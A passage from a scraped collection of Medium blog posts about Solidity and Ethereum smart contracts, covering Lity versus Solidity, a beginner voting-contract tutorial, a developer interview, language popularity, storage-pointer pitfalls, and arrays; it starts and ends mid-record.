more recent bug also was discovered in the smart contract used by Parity, which was exploited and resulted in the loss of half a million Ether (ETH), worth more than $169 million.Is Solidity to Blame?As issues with smart contracts become more common, Solidity has gained attention as being problematic for the Ethereum network. Unfortunately, many new projects that rely on smart contracts lack programmers with the experience needed to properly optimize and audit smart contracts.For example, in terms of performance, gas fees can be astronomical when executing certain complex smart contracts. \u201cGas\u201d is a nominal unit of Ether that is spent on operating transactions on the Ethereum network. It depends on the complexity of the Smart contract and the congestion of the network at the time of the contract execution. Ethereum automatically punishes slow and complex contracts, rightfully, by charging them very high gas fees. But, in many cases, the use case is inherently complex and such gas fees hamper the real adoption of smart contracts.For instance, using an Ethereum smart contract to verify the header of a single Bitcoin transaction (i.e., a scrypt operation) will cost 370 million Ethereum gas \u2014 more than 1 billion Gwei (1 ETH) at the gas price of 3 Gwei. That is approximately $500 (USD) just to verify a transaction, which has to be done across more than 100 Ethereum contract transactions.Security, specifically integer overflow, is also problematic when dealing with smart contracts written in Solidity. Hackers are now detecting bugs in smart contracts, allowing them to steal large amounts of cryptocurrency. This has resulted in a high security alert, as multiple ERC20 token contracts are prone to hacks.Many of these hacks occurred simply due to mistakes that programmers have made when writing lines of code in Solidity. For example, the Beauty Chain (BEC) was a high-profile cryptocurrency in China, which started trading on OKeX on February 23, 2018. It spiked 4,000 percent on the first day of trading. From its peak market cap of around $70 billion (USD), the price has gradually decreased to around $2 billion (USD) as of April 22, when its trading value suddenly dropped to zero. (OKEX since suspended trading of BECs.)This happened due to a bug in the BEC\u2019s ERC20 smart contract. In the case of BEC, the developer added a method called \u201cbatchTransfer()\u201d to the contract. The method is intended to facilitate token transfer to multiple parties at once (in other words, a batch).Image credit from the CVE-2018\u201310299 security alertHowever, the developer made a crucial mistake in the following line of code:uint256 amount = uint256(cnt) * _value. (You can read more about this in Michael Yuan\u2019s Medium post.)Now what?A Solution for SolidityIn order to solve the real-world problems facing smart contracts written in Solidity, one impressive language called \u201cLity\u201d is being created for developing smart contracts across the CyberMiles blockchain, decentralized applications, and other customized blockchains. In particular, Lity aims to solve the performance and security issues facing Solidity.Lity consists of a dynamically extensible language, a compiler, and a virtual machine runtime, making it an evolution of the Solidity language. This means that all of the existing Solidity programs today can run without changes on the CyberMiles virtual machine (CVM).Another advantage of using Lity language is that it\u2019s more flexible than Solidity, more powerful and safer. For example, Lity supports new language functions and features that can be added over-the-air.In terms of performance, Lity extensions are for specific computing tasks and can be highly optimized. Known as \u201clibENI\u201d functions that are to be called from the CyberMiles virtual machine (CVM), this is executed as native code on the blockchain nodes.For example, public/private key algorithms are typically very slow and prohibitively expensive on the Ethereum network. Many classes of applications, such as most \u201cdata marketplaces\u201d, are practically impossible on Ethereum. With libENI, however, those operations take milliseconds (10,000 times faster) and require very low gas fees (a few cents, compare to the aforementioned $500 in gas fees to perform a cross-chain transaction).Lity\u2019s computational improvements have great implications on cross blockchain asset exchanges, as well as on incorporating off-chain data into blockchain transactions.Finally, the Lity compiler checks for compliance and known bugs in ERC 20 and ERC 721 contract code, while providing support for ERC 223 standard in ERC 20 contracts to prevent accidental token transfers to unsupported contract addresses. At the virtual machine level, Lity automatically prevents common issues such as integer overflow, or setting contract owner to nil.The Future of Smart ContractsUnfortunately, Solidity has become a source of blame for the errors found in today\u2019s smart contracts. In order to ensure the future of smart contracts, new programming languages like Lity are being developed.But make no mistake, the Ethereum Foundation is actively looking for ways to innovate on its own. Chief among them is working on the implementation of \u201cCasper\u201d and native contracts, the transition mechanism that eventually will migrate Ethereum to a PoS consensus method. The Ethereum Foundation believes this change is necessary to solve the various problems associated with PoW. The CyberMiles Foundation, for its part, already claims to have figured out the solution: a working DPoS model and its CVM, as litylang.org outlines. The race is on.While such modifications will mark a shift in one of the core technological elements that defines Ethereum today, its execution likely will have large implications for Ethereum, and particularly on its core components \u2014 smart contracts.Read more of Rachel\u2019s articles on blockchain and cryptocurrency on ForbesFollow Rachel on Twitter at @Rachelwolf00", "responses": 1, "tags": ["Blockchain", "Ethereum Solidity", "Ethereum", "Solidity", "Smart Contracts"]}, {"title": "Solidity 101: Intro to Ethereum Smart Contracts and Solidity", "post_link": "https://medium.com/kambria-network/solidity-101-intro-to-ethereum-smart-contracts-and-solidity-82e9889b1736?source=search_post", "author_name": "Kambria @ www.kambria.io", "author_link": "https://medium.com/@teamkambria", "publish_date": "2017-11-08", "last_modified_date": "2018-10-25", "readtime": "5.53", "claps": 264, "voters": 20, "content": "Solidity 101: Intro to Ethereum Smart Contracts and SolidityA beginner\u2019s guide to the programmable blockchainKambria @ www.kambria.ioFollowNov 8, 2017 \u00b7 6 min readEthereum is the new programmable money.By the end of this article, you\u2019re going to know how to write simple Ethereum smart contracts using the Remix \u2014 Solidity IDEWhat IS Ethereum?In 2009, someone, under the alias of Satoshi Nakamoto, introduced the concept of Bitcoin, the most successful digital currency to date. It popularized the idea of a truly decentralized monetary systems that every transaction is stored in the blockchain. Ethereum attempts to do further than that, by combining the power of decentralized transactions with a Turing-complete programming languague (which essentially means you can write programs that can solve any reasonable computational problem).If you want to get your feet wet with your first smart contracts, a popular language at the moment is Solidity. This guide will walk you step-by-step in learning Solidity by creating an Ethereum Smart contract.Your first smart contractTo start with, we will be building a voting smart contract that allows users to propose a new proposal - vote for or against the existing ones and quickly query the winning proposal. The idea of this originates from CarbonVote, a web-page with the feature that the voting conducted did not require coins to leave voters\u2019 wallets. The votes are computed at any instant by looking at the amount of ETH in each address that either votes yes or no. The proposer also needs to stake some ETH (5 ETH in this example) behind the proposal which they can get back when they cancel/close the proposal.Getting started with RemixIf you\u2019re new to developing for Ethereum, it can be a daunting task! To make things easier, I\u2019ll keep this article as simple as possible for the first-timer! For that purpose, I\u2019ll use a zero-install, in-browser IDE The Remix Solidity Editor.Use the (+) button at the top-left corner to create a new file and name it Voting.solCode skeletonSolidity versionFirst, let\u2019s start off the contract by declaring the solidity version we support:The contract is written to support the Solidity compiler version 0.4.15 or later but not on a compiler starting from version 0.5.0 (this second condition is added by using ^)Structs2 types of struct in the contractWe created 2 structs in this contract: the Voter and the Proposal. The Voter struct contains a Dictionary which maps the index of the proposal with True/False to indicate whether the voter already voted for proposal $index. Every proposal contains these information: the content of the proposal, number of vote for/against, block number when the proposal was propose, the proposer\u2019s address and its canceled status (true if it\u2019s canceled by the proposer, false otherwise)EventsThe contract emits events upon voting for a proposal(VoteFor or VoteAgainst), adding/canceling a new proposal (ProposalAdded/ProposalCanceled) and refunding the staked Ether back to the proposer (Refund). Each event contains the necessary information to track what happens when the voting is conducted.ModifiersFrom the Solidity docs, modifiers:can automatically check a condition prior to executing the function. Modifiers are inheritable properties of contracts and may be overridden by derived contracts.In this contract, notEnded modifier was used to make sure the voting is still running. checkValue will make sure the proposer stakes in sufficient Ether for every proposal and refund the excess amount back.ConstructionsDeploying the contract will call the constructor \u2014 which is called exactly once and cannot be called again. It initializes the value of initial number of proposal and the status of the voting.Propose a proposalWhenever a user propose a new proposal, it\u2019s added to the proposals array the event is logged. The number of proposals and the staked ether of the proposers are also incremented.Note: We can apply multiple modifiers to a function by specifying them in a whitespace-separted list of the function header. They will be evaluated in the order presented.. In the above code snippet, we added 2 modifiers notEnded and checkValue to make sure the voting is still up and the proposer sends in the appropriate amount to the contract.Cancel a proposal and refundWhen a proposal is canceled by its\u2019 owner, it\u2019s marked as canceled and the Ether staked in the proposal is refunded back. The send method will send the amount of ether specified back to the proposer. It will return true/false indicating whether the refund is succesful.Warning: Always remember to deduct the balance before calling send to prevent reentrancy exploit (e.g: The attacker can spam the refund function. The send method may not finish before the attacker make another call to the refund and end up calling send multiple times before decreasing the proposer\u2019s balance)VoteWhen a user votes, he/she either votes for or against a proposal. We want to check if the proposalIndex is valid and it\u2019s not canceled before proceeding. We also want to prevent a user from voting a proposal twice by checking the dictionary votedProposals of each voter. Then we increment the vote count of the proposal by the balance of ether (in wei unit) of the voter. An event is also logged to mark a vote eventQuery all information of a proposalCalling this function with appropriate index will give you all the information (the content, the number of vote for/against, proposer\u2019s address and block number proposed) of the proposal. It returns a tuple of values that you can extract further in a web application.Query the winning proposalWhen this function is called, it will return the index of the proposal with the highest (voteFor-vote Against).Deployment and testingDeploy the contractDeployingOn the right panel, use these selection:Environment: Javascript VMGas Limit: 300000Gas Price: 0Value: 0Create: <keep blank>and click Create. The contract will be deployed to the test blockchain.Interacting with the contractYay! It worked.Type in the proposal you want to add in addNewProposal box and the value you will send to the contract in the value box. In this demonstraion, we sent 30 ETH with the proposal \u201cBuild a voting contract\u201d to the function addNewProposal.Even though we sent 30 ETH with the proposal, you can see that only 5 ETH were deducted from the account. Our modifier checkValue() has checked for excess amount and send back the unnecessary ETH amount.Querying the proposal using the index (e.g: 0 in the demonstraion) shows all the information about proposal (content, number of votes for and against, sender and block number)You can interact more with the contract by adding more proposals, switching between multiple account, vote yes or no for the proposals and query the winning one.What\u2019s next?Where to go after here you ask?You could test this code on the Ethereum testnet, or you could create a web app that would allow users to interact with the Voting contractThere are a ton of tutorials on Solidity out there, but a some that we find the most helpful:The Solidity Docs Site.Learning Solidity series by Karl Floersch.Getting Started as an Ethereum Web Developer by Alex Miller.This is a very first step in learning Solidity and Ethereum smart contracts. We are curious to know what you will be coding from here.If you\u2019re excited about the intersection of robotics and blockchain, join our Telegram channel and checkout our websiteIf you have questions, concerns, or feedback \u2014 let us know in the comments.Authored by Khoa Ho, Software Engineer @ Kambria", "responses": 2, "tags": ["Ethereum", "Solidity", "Blockchain", "Kambria", "Thought Leadership"]}, {"title": "Team Interviews: Bingen, Aragon\u2019s Solidity Engineer", "post_link": "https://medium.com/aragondec/team-interviews-bingen-aragons-solidity-engineer-9ae1bf9814fc?source=search_post", "author_name": "Tatu K\u00e4rki", "author_link": "https://medium.com/@Smokyish", "publish_date": "2018-02-21", "last_modified_date": "2018-05-29", "readtime": "7.39", "claps": 179, "voters": 18, "content": "Team Interviews: Bingen, Aragon\u2019s Solidity EngineerBingen is a developer and an open source advocate joining Aragon to make the world a better placeTatu K\u00e4rkiFollowFeb 21, 2018 \u00b7 8 min readToday our Team Interview is with Bingen, Aragon\u2019s new Solidity Engineer \u2014 we talked about his interest to make the world a better place through Aragon, and what are his thoughts on Ethereum.Past team interviews:Luis| Jorge | Tatu | Mar\u00eda | Luke | Pierre | John | Brett | AlexaHi Bingen, welcome to the team!Could you tell us about yourself, your background and how you got into the blockchain space?I have a Bachelor\u2019s degree in Mathematics and an Associate\u2019s degree in Philosophy. In addition I have done several online courses on subjects like cryptography, software security, blockchain and machine learning, plus a lot of self-learning.My work experience has mainly been as a software developer. Most notably and recently in a couple of successful startups, one in the networking industry and one doing mobile payments for parking and transit. But I have also been a math teacher for some time and I even owned a musical pub (which was really fun, but a total failure).I\u2019m a very curious person and thus I like many different things, to name a few hobbies I would say:Music. Just listening, I already realized that I have no aptitude for it in spite of how much I like it. I\u2019m very eclectic, some of my favourite artists are Kraftwerk, Leonard Cohen, CocoRosie, Astrud, Franco Battiato, Dire Straits, The KLF or Kill the DJ, but the list would be almost endless.Craft beer. I even brew my own. Someday I will realize, like with music, that I\u2019m not good at it and I will just drink it, but I\u2019m still trying.Travelling. I\u2019ve visited more than 30 countries.Sports. Soccer, all kind of water sports, especially sailing and swimming. Although I wouldn\u2019t call them sports, I also like wushu and tai chi.I like to think that I am very open minded. I would like to say, like Herman Hesse\u2019s Siddhartha, thatI can think. I can wait. I can fast.I don\u2019t think I can, yet, but I try.As for how i got into the blockchain space, after some time hearing about Bitcoin and procrastinating a deeper dive into it, I decided to buy some as a way to force myself to learn more about it. This was in the beginning of 2014, after the Mt. Gox crash. At about $800, I thought it had fallen enough and was already recovering, hahaha. Then I tried mining some too, but with just a regular computer and I was kind of late for that. I finally learned how it was working under the hood and I was really impressed by the technology, but even more about what it meant to decentralize money.Then Ethereum came, and the possibility to apply the blockchain idea to almost anything, adding a Turing complete language to the mix, blew my mind. I began reading all the articles I could about blockchain and decided to learn Solidity. And now here I am, ready to be part of the revolution and help Aragon change the world for the better.How do you see that we at Aragon can change the world for the better and what are you excited about working on?Well, in this huge and blooming blockchain scene Aragon falls in the category of Infrastructure.We expect lots of projects will be using it to decentralize different aspects of society. So it might be less visible to the end-users but it will be crucial for the blockchain and decentralization movements to succeed.Besides, one of the biggest priorities for Aragon as a project is governance. There\u2019s a lot of room for exploration and improvement there that can have a big impact in the way the societies are organized, how human beings interact with each other and how power is distributed.Another huge benefit will be getting rid of bureaucracy. I have personally experienced the inconvenience of it a couple of times when trying to launch companies and it was really awful.Although we are seeing interesting advancements like the Estonian e-Residency (which I already applied for), an Aragon DAO would of course be far more efficient and convenient.For Aragon to succeed there has to be an existing common vision. Finding good developers, for instance, is not easy, but it\u2019s not that hard. What is really hard, is to find good developers that are also a cultural fit, especially in small companies. I have experienced this myself in my previous jobs at various startups.In the case of Aragon, I would say that being such an extraordinary project with very a distinct vision makes this even harder. But from what I have seen so far, we are doing an excellent job in this regard.I would say we should be pragmatic in our future development. I think Jorge said it perfectly:We don\u2019t do too much early optimizations and try not to over-engineer. Even though we love technical correctness, product and function always comes first.\u2014 Jorge IzquierdoDid you have any concerns before joining the team and what do you see as possible challenges in your future work?Although I love the design of the Aragon logo, my first impression of the eagle was not so good. I wondered if it was the best choice, as it recalls of empire, starting with the Roman one and is very much still present in Spain. Then a picture of an eagle that I took in Namibia came to my mind and made me realize that it was not fair for this elegant animal. So I learned to love the Aragon eagle as a way to restore its image. I even put it as my profile picture in some social networks.Working on Aragon Labs is especially exciting as it means working in the more experimental things of an already cutting edge project. But experimenting also often means failing, which is always difficult and can be frustrating. This is something I keep in mind, but knowing how awesome the team is that I\u2019ll be working with, alleviates a lot of my worries.What are your thoughts on Ethereum, do you think it can overtake the Web 2.0?I actually never liked the term \u201cWeb 2.0\u201d because I thought there was not that much technological innovation (but a lot of hype and marketing) involved with it. Users were already able to have an active role, to generate content, to participate from the very beginning. It\u2019s true that some paradigms were changed and some applications made it easier (and of course technology improved over time as it always does), but it was not a whole new thing.Now I see that it was a step back, because the closed silos around these platforms, products and services appeared. It betrayed the open spirit of what the Internet initially was supposed to become. Even some of the very widely used tools like Flash were closed.Web 3.0 is re-establishing that original spirit, empowering users again. And it\u2019s also a big technological improvement (although, of course, as it always happens, it relies on pre-existing technologies too, like cryptography and Proof-of-Work).Main issues with Ethereum are well known in the community and hopefully will be resolved soon. I would say the biggest challenge right now is scalability. Besides some user experience improvements, the developer tools in the ecosystem maturing (e.g., an open source blockchain explorer, which Jordi Baylina is working on) and good oracles to connect to the off-chain world would be of great benefit.What about other Ethereum based projects, which one\u2019s are you enthusiastic about?The list would be almost endless, but let\u2019s mention some of them:Provenance. A supply chain project. I think we all have great responsibility as consumers, but information and transparency is key to making the right choices.Democracy Earth. I was a big fan of their old project DemocracyOS. Now with blockchain everything makes even more sense and has become easier.Circles UBI. It\u2019s still very new, but I have been interested in Universal Basic Income for long time. First of all I\u2019m really curious to find out if it would work. But it is clear to me that we do need to find another model for wealth distribution, even more now/soon with AI exploding.Grid+. Climate change is one of the biggest problems we have as a society and our energy model clearly is unsustainable.Ujo, because I love music and centralized distribution has hurt both artists and consumers a lot in the past. We really need to change the model.Status, Steemit, Leeroy. The internet was actually decentralized by nature in its inception, based on open protocols (SMTP, HTTP, etc). Then the big walled gardens (like Facebook, Twitter or even Medium where we are publishing this!) came and centralized everything. We have to give communications back to the users.BAT. For similar reasons to the two previous ones.Radar Relay and 0x (and other decentralized exchanges). It\u2019s kind of ironic that in the decentralized world we are using centralized exchanges, right? Besides, in their short history they have proven to be problematic, starting with Mt.Gox.Golem, Storj, etc. The cloud has been a cool buzzword for some time, let\u2019s decentralize it too!Gnosis and Augur. I\u2019m not too interested in betting (although decentralizing it is cool too, of course), rather than in the kind of collective knowledge it can provide.Being a developer, what are your tools of trade that you use in your work and what programming languages are you familiar with?First of all I use Linux as my operating system, and it has been like that for more than 15 years. I am big FOSS lover and advocate (also of open source hardware \u2014 I was a proud owner of an OpenMoko Neo FreeRunner and a Neuros II, and of open data as well, I\u2019ve participated in contributing to OpenStreetMap some time ago). Right now I\u2019m using Debian and Ubuntu, but I have tried a lot of other distributions over time. On top of it, I\u2019m using Emacs as my editor and zsh as my shell. I have tried other editors and IDEs in the past too, but I\u2019ve been happy with this combination so far.I know C/C++, PHP, Python, Javascript, Java, SQL, some Haskell and Lisp, Octave, of course Solidity. I once even knew COBOL and Natural/Adabas! Although I learnt a little bit of C in college, most of it has been self-learning, starting with BASIC when I was 8 years old.Thank you for sharing your thoughts and vision Bingen!You can also follow Bingen on Twitter!To keep up with the progress of Aragon:Come chat with us at the Aragon ChatFollow Aragon on TwitterSubscribe to the Aragon subredditFollow Aragon at LinkedInContribute to Aragon at GitHubFind us on YouTubeSubscribe to Aragon Monthly NewsletterExplore the Aragon WikiBrowse job openings at Aragon", "responses": 0, "tags": ["Blockchain", "Ethereum", "Bitcoin", "Cryptocurrency", "Open Source"]}, {"title": "Solidity is Twice as Popular as the Next Blockchain Coding Language", "post_link": "https://media.consensys.net/solidity-is-twice-as-popular-as-the-next-blockchain-coding-language-9330af9aeaa3?source=search_post", "author_name": "ConsenSys", "author_link": "https://media.consensys.net/@ConsenSys", "publish_date": "2019-05-30", "last_modified_date": "2019-05-31", "readtime": "3.25", "claps": 200, "voters": 20, "content": "Solidity is Twice as Popular as the Next Blockchain Coding LanguageSorry, JavaScript. Smart contracts are in the ascendency. But will eWASM change the game?ConsenSysFollowMay 30 \u00b7 4 min readA new report by The Next Web\u2019s Hard Fork analyzed data compiled by StackOverflow to chart the most popular coding languages used by developers working on blockchain.The study, which searched StackOverflow for questions tagged as \u2018blockchain,\u2019 queried 2724 entries and found that Solidity\u2014the current language of Ethereum smart contract implementation\u2014by far outranked every other coding language in frequency.In fact, Solidity appeared approximately twice as much as the next referenced language \u2014 the ever-present JavaScript \u2014 with 9.5% of total mentions compared to JavaScript\u2019s 4.8%.Via Hard Fork: \u201cSolidity appeared a total of 259 times. JavaScript was mentioned in 130 questions, followed by Java with 71 mentions. Python and Google\u2018s Go complete the top five, with 66 and 58 mentions respectively.\u201dQuorum, utilized for developing Ethereum-based permissioned networks, garnered 30 mentions, with C# (25), RIDE (22), and C++(13) rounding out the top ten.Here\u2019s the same data presented in percentage form\u2026So while these numbers are highly encouraging for Ethereum developers, will the trend continue to play out in this pattern into 2020 and Ethereum 2.0?\u201cI\u2019m watching closely to see if Solidity maintains the top position as eWASM (Ethereum flavored Web Assembly) comes out,\u201d says Kevin Owocki of Gitcoin. \u201cAll of the WASM-based languages (Javascript, Python, Java, Go) are widely adopted, and after eWASM they could all be used to write smart contracts on Ethereum\u2014and even secondary smart contract platforms. It\u2019s possible that we could see an influx of web3 developers into the Ethereum space, and a Cambrian explosion of new smart contracts created as a result.\u201dAlthough the Hard Fork study\u2019s methodology isn\u2019t quite watertight, it surely is effective in extrapolating a picture of this early stage of blockchain development. On a grander scale, Solidity doesn\u2019t crack the top ten of all coding languages referenced on StackOverflow. So although the transition from Web2 to Web3 continues to pick up steam, clearly there\u2019s still a long way to go!The freshly released Blockchain Jobs Report, 2019 cited a LinkedIn Emerging Jobs report that stated 2018 had seen a 33x increase in blockchain developer jobs. Further data showed that blockchain developer salaries range from $125,000 to $195,000 per annum, and that the blockchain industry has a marked propensity towards remote work. And with global enterprises like IBM, Ernst & Young, and Oracle hiring alongside startups like ConsenSys and Axiom Zen, it\u2019s clear that blockchain development \u2014 and Solidity \u2014 are very much on the up.If you\u2019re a coder or software developer looking to get into blockchain, there are few great places to start. The Ethereum Developer Portal has a comprehensive list of everything you\u2019ll need to get going, as does this comprehensive list of Ethereum developer tools. ConsenSys Academy has a wealth of courses and webinars to get you up to speed, and once you\u2019re ready, the Blockchain Developer Job Kit can help you put those tools to use.Disclaimer. The views, information, and opinions expressed are solely those by the author above do not necessarily represent the views of Consensys AG. They are meant for informational purposes only, are not intended to serve as a recommendation or investment advice to buy or sell any securities, cryptoassets, or other financial products.", "responses": 2, "tags": ["Ethereum", "Tech", "Blockchain", "Startup", "Coding"]}, {"title": "Storage Pointers in Solidity", "post_link": "https://blog.b9lab.com/storage-pointers-in-solidity-7dcfaa536089?source=search_post", "author_name": "Rob Hitchens", "author_link": "https://blog.b9lab.com/@robhitchens", "publish_date": "2018-11-16", "last_modified_date": "2019-01-17", "readtime": "5.47", "claps": 260, "voters": 18, "content": "Storage Pointers in Solidity\u201cHere be dragons\u201dRob HitchensFollowNov 16, 2018 \u00b7 6 min readPhoto by mauR\u00cdCIO santos on UnsplashThis post is a warning.Immutability is a two-edged sword. On the one hand, everyone is assured that software will execute as written because no departures from the deployed code will be permitted. On the other hand, immutability implies a very unforgiving environment. This is one of the reasons for adopting a minimalist approach to contract design.Implicitly, minimalism means contract functions should be self-explanatory and easy to reason about. It\u2019s important that code works and it\u2019s important that observers can see that it works.This is why storage pointers as a \u201cfeature\u201d of the language make me uncomfortable. They can be created unintentionally, they are easy to overlook and the consequences of overlooking them can be catastrophic. Mapmakers of old would warn adventurers about treacherous regions where strange and dangerous and unexpected things can and do happen. They had a short-form expression for mysterious mortal dangers: \u201cHere be dragons.\u201dWhat are Storage Pointers?Solidity has memory variables that don\u2019t persist beyond the execution of a given function, and storage variables that are part of the contract\u2019s persistent state.Here\u2019s a simple (and safe) example:contract Safe {  uint x = 100;  function getXAndY() public view returns(uint, uint) {   uint y = 101;   return (x,y); }}So far, so good. We get (100,101) as expected.There is more going on here, implicitly, than meets the eye. For now, let\u2019s just say \u201cx\u201d is a storage variable and \u201cy\u201d is a memory variable. It\u2019s implied because \u201cx\u201d was declared globally and \u201cy\u201d was declared inside a function.\u201cx\u201d and \u201cy\u201d are both \u201cscalar\u201d variables. If you\u2019re not familiar with the term, it just means they are of a basic type (in this case, an unsigned integer) with a single value. This is going to be important, because the rules that apply to scalar variables with regard to this issue of memory and storage are different than the rules that apply to indexed variables (arrays and mappings) and structs. That can lead to \u2026Surprise!Have a look at this:contract FirstSurprise {  struct Camper {   bool isHappy; }  mapping(uint => Camper) public campers;  function setHappy(uint index) public {   campers[index].isHappy = true; } function surpriseOne(uint index) public {   Camper c = campers[index];   c.isHappy = false; }}Suppose we \u201csetHappy(0)\u201d then invoke \u201csurpriseOne(0)\u201d. Do you suppose campers[0].isHappy? You can be forgiven if you think so, but it is overwritten byc.isHappy = false;What\u2019s going on?\u201cc\u201d is a struct, and we\u2019re allowed to declare them as \u201cmemory\u201d or \u201cstorage\u201d pointers. The default is storage, so it\u2019s a storage pointer. We said it equals a \u201ccampers\u201d at a certain index. Now, it might be inefficient to copy a whole struct from storage to memory, so Solidity just gives \u201cc\u201d a \u201cstorage pointer\u201d to wherever the values actually reside. Great, but then we\u2019re at risk of accidentally overwriting storage, which we did when we set one of c\u2019s members to something new.I am not big fan of this. In my opinion, surprise is an anti-feature in an unforgiving environment.In fairness, the compiler has improved from early days and there are warnings. For example:Variable is declared as storage pointer. Use explicit \u201cstorage\u201d keyword to silence this warning.This is a warning to let you know that you are declaring a struct, array or mapping (which you should not do) in a function and it\u2019s going to implicitly be a \u201cstorage\u201d (pointer) and you might not be aware of it.What if you follow the suggestion?Camper storage c;That will silence the first warning and give you something else:Uninitialized storage pointer.What does that mean? That means it\u2019s a storage pointer that doesn\u2019t know what it should point to because it wasn\u2019t set to anything with \u201c= expression.\u201d So, it will just point to slot 0. That means if you set \u201cc\u201d to anything, that will overwrite whatever is in slot 0. Yikes! This reminds me of IT Haiku circulars that went around before memes caught on. Here\u2019s mine, for entertainment purposes:Something in slot 0.Probably important.Now, it is gone.Did I mention I do not like this?Have a look here for another example of how this can and does create quite unexpected results: https://ethereum.stackexchange.com/questions/62384/bytes-variables-are-connected/62394#62394Another surpriseHere\u2019s the same contract with an added uint variable that is set to 100, and another surprise:contract AnotherSurprise {  struct Camper {   bool isHappy; }  uint public x = 100;  mapping(uint => Camper) public campers;  function setHappy(uint index) public {   campers[index].isHappy = true; }  function surpriseTwo() public {   Camper storage c;   c.isHappy = false; }We were warned that \u201cc\u201d is an \u201cuninitialized storage pointer\u201d (meaning, it points to slot 0). Try \u201csurpriseTwo()\u201d. Then, look at \u201cx().\u201d What happened to poor Mr. X? \u201cx\u201d isn\u2019t 100 anymore. It\u2019s 0, because \u201cfalse\u201d cast as a uint is 0. And guess what? \u201cx\u201d just happened to reside in the first storage slot, so when the errant uninitialized storage pointer decided to write something down it scribbled on top of \u201cx\u201d. Sorry, Mr. X. Unlucky for you.Slot 0 could even be the \u201c.length\u201d of a dynamic array or the owner of the contract. Nothing good can come out of accidentally overwriting important data. And, it\u2019s all important because we believe in minimalist design.Why are Storage Pointers even useful?There are arguments in favor of storage pointers. For one thing, they reduce the amount of data that gets passed around and that saves gas. They can also lead to readable code. Consider this usage:function slightOfHand(uint index) public {   Camper storage c = campers[index];   c.isHappy = false;}That updates the storage and means you don\u2019t need to repeat the more verbose form, \u201ccampers[index]\u201d, but coders and reviewers need to be aware that \u201cc\u201d is really the same as writing the more verbose expression. In other words, it\u2019s short for:campers[index].isHappy = false;My discomfort with this is that this is very easy to overlook, especially for learners. It contributes to mental overhead when we should be aiming for simplicity. It can lead to a surprise. Dragons!Safety HabitsStorage pointers are advantageous when you know what you\u2019re doing. But how can newbies operate safely while they learn? Here are some tips. Please comment!You can generally avoid trouble by adopting these habits:Never declare a mapping inside a function. There be dragons.Never declare persistent storage inside a function, even if the compiler seems to let you.In your functions, always explicitly declare structs and arrays as either transient \u201cmemory\u201d or \u201cstorage\u201d pointers. This habit helps you pause and think about what\u2019s going on.Never ignore warnings about storage pointers. This bears mentioning because they don\u2019t stand out against other warnings that can be safely ignored. Storage pointer warnings == dragons in your vicinity. Don\u2019t shrug it off.Feel free to instantiate storage pointer aliases for verbose syntax, but form the habit of using them on a read-only basis. For example:Product storage p = productStructs[productIdList[productListRow]];return (p.id, p.desc, p.price);6. Use extreme caution when setting a variable that was initialized with a reference to something in storage.p.price = // Stop. Caution. Do you know where this is going?Storage pointers are a subtlety in Solidity. It takes practice to learn what they are and how they work.If this post helps you remember storage pointers exist so you\u2019re aware that they might be in play (even unintentionally) then hopefully that will prompt an impulse to double-check assumptions, thoroughly test and reinforce awareness of the need for thorough code audits before releasing code in production.At B9lab, we are dedicated to guiding students to the top of this field. Our hands-on training programs mentored by instructors like myself and workshops prepare students for stringent certification exams.Start with your Ethereum Developer Certification and consider branching out to Quorum Specialist (think \u201centerprise\u201d) or Quality Assurance Specialist. Maybe even check out Hyperledger, Corda and EOS. They too are interesting and different.", "responses": 0, "tags": ["Programming", "Solidity", "Ethereum"]}, {"title": "Arrays in Solidity", "post_link": "https://medium.com/hackernoon/arrays-in-solidity-b65c1326f48b?source=search_post", "author_name": "Aventus Network", "author_link": "https://medium.com/@aventus", "publish_date": "2018-07-20", "last_modified_date": "2018-07-25", "readtime": "5.46", "claps": 245, "voters": 17, "content": "Arrays in SolidityAventus NetworkFollowJul 20, 2018 \u00b7 6 min readThis is the second Aventus technical blog on Solidity from Alex Pinto, a recent addition to our blockchain engineering team. You can read his first post on Working with Strings in Solidity.There are many occasions when we want to pass to a function a group of similar data that may, or may not, be limited in number. The most basic data type for this situation is an array (and in several cases, this can be used to implement more advanced data structures). We can pass and return arrays without problems, as the following illustrates.The above uses arrays of uint, which represents a 256-bit integer, of unlimited size. That means I can pass any array of the correct type into the function. It also means I have to initialise the return array in getArrayMultipliedByScalar before I can use it, since at the time outArray_ is declared it does not allocate any memory for its elements (it could have any size).For comparison; if I used fixed-size arrays, as below, two things happen:I no longer need to initialise the outgoing array.The compiler returns an error if the function receives an array with any other size but 3.We can make arrays of other types, like bool and address - but what about multi-dimensional arrays?We can pass bi-dimensional arrays of fixed size:Sadly, things are more difficult with dynamic arrays.Some languages, like BASIC and Pascal, index bi-dimensional arrays by a tuple of indices. In these languages, arrays are genuine (rectangular) matrices. But in C-derived languages, multi-dimensional arrays are arrays-of-arrays, instead of matrices. That is the case with Solidity as well, and it pays to take some time to understand what this type declaration means: uint[2][4] should be read as (uint[2])[4], that is, 4 arrays each of size 2.This is important when we consider dynamic arrays. We could have both of these kinds:The first example above is a fixed-size array which has 3 elements, each of which is a dynamic array. In the second case, we have a dynamic array outright, but its elements are arrays of fixed size.I discuss below how to initialise fixedSizeArray, which is the most interesting case of the two. Regarding dynamicArray, because it is a dynamic array, we first must allocate memory for it using new and then we can access the fixed-size elements. The example below works:Initialisation of multi-dimensional dynamic arraysLet\u2019s explore an example similar to the above in more detail:TypeError: Type uint256[3] memory is not implicitly convertible to expected type uint256[3] storage pointer.The arrays fixedSizeArray and dynamicArray are declared as state variables of the contract, and so are by necessity storage references. Storage arrays can not be initialised from newexpressions, as these are of type memory. Nevertheless, we can initialise each of the arrays inside fixedSizeArray using memory-array expressions, as shown above.For comparison, I included also two cases where I try to assign a memory array to an explicit storage one. In the constructor, this works, but not in the second function. Why?This is because the types of storageArray and of localStorageArray are not exactly the same. The former is a state variable of the contract, and when it is referred inside the constructor, its type is uint256[3] storage ref (to see this, change the assignment\u2019s right value to something illegal, such as 7, and the error message will show you the types involved). In comparison, the type of localStorageArray is uint256[3] storage pointer. Subtle difference. In the first case, we have a reference to a location in storage, and the assignment copies the memory array to that storage. In the second case, we try to assign to a local variable which according to the documentation just creates a new reference to a previous pointer:Assignments to local storage variables only assign a reference though, and this reference always points to the state variable even if the latter is changed in the meantime.Excerpt from Solidity documentationIn the above example, y is a pointer to the same location known as x, and modifying one causes changes in the other. But in our case, we are trying to assign a memory array to a storage variable which, being of a different type, cannot produce a pointer to that memory location.On the other hand, when we initialise fixedSizeArray, we are actually referring to a storage reference. In this case we can assign from a memory array, which has the effect of completely copying the source over the target, erasing all of its previous contents.Can we pass multi-dimensional arrays to functions?It depends!We can use Solidity\u2019s 